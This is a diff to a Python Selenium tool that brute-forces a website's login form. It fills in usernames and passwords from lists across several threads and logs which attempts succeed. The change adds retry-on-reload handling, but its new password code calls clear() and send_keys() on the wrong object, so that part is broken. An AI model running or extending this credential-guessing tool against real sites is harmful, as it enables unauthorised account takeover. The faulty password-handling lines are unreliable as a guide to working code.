@@ -5,7 +5,6 @@ from queue import Queue
 from config import *
 import threading
 import time
-import os
 
 
 
@@ -23,32 +22,45 @@ class TargetObj:
 
 	def __init__(self):
 		self.__driver = webdriver.Firefox()
-		self.__driver.get(TargetObj.url)
-		self.__driver.implicitly_wait(10);
+		self.__open_url();
 
+	def __open_url(self):
+		self.__driver.get(TargetObj.url)
+		self.__driver.implicitly_wait(10)
 
 	def __get_input(self, var_name):
 		return self.__driver.find_element_by_name(var_name)
 
 	def substitute_login(self, login):
-		# find login input if it has been reloaded / readded #
-		try:
+		def set_login_input(login):
 			self.__login_input = self.__get_input(TargetObj.login_var)
 			self.__login_input.clear()
 			self.__login_input.send_keys(login)
+		try:
+			set_login_input(login)
 		except NoSuchElementException:
-			print(LOGIN_INPUT_ERROR)
-			os._exit(1)
-
+			try:
+				self.__open_url()
+				set_login_input(login)
+			except NoSuchElementException:
+				print(LOGIN_INPUT_ERROR)
+				self.__driver.close()
 
 	def substitute_password(self, password):
-		try:
+		def set_pass_input(password):
 			self.__pass_input = self.__get_input(TargetObj.pass_var)
-			self.__pass_input.clear()
-			self.__pass_input.send_keys(password)
-		except:
-			print(PASSWORD_INPUT_ERROR)
-			os._exit(1)
+			self.__pass_input = self.clear()
+			self.__pass_input = self.send_keys(password)
+		try:
+			set_pass_input(password)
+		except NoSuchElementException:
+			try:
+				self.__open_url()
+				set_pass_input(password)
+			except NoSuchElementException:
+				print(PASSWORD_INPUT_ERROR)
+				self.__driver.close()
+
 
 
 	def submit(self):
@@ -73,16 +85,15 @@ class TargetObj:
 					self.__driver.quit()
 		time.sleep(TIME_PAUSE)
 
-
 	def parse_response(self):
 		try:
 			body = self.__driver.find_element_by_tag_name("body")
 			if self.failure_sign in body.text:
-				return "FAIL"
+				return ON_FAIL_LOG
 			else:
-				return "[+] SUCCESS [+]"
+				return ON_SUCCESS_LOG
 		except:
-			return "[!] PARSING PAGE ERROR [!]"
+			return RESPONSE_PARSING_ERROR
 
 	def exit_driver(self):
 		self.__driver.quit()
@@ -140,8 +151,6 @@ def brute_force(logins, passwords, num_threads, reverse = False):
                                     , args = (obj_per_thread, queue, passwords))
 			thrd.daemon = True
 			thrd.start()
-
-
 	else:
 		for passwd in passwords:
 				queue.put(passwd)
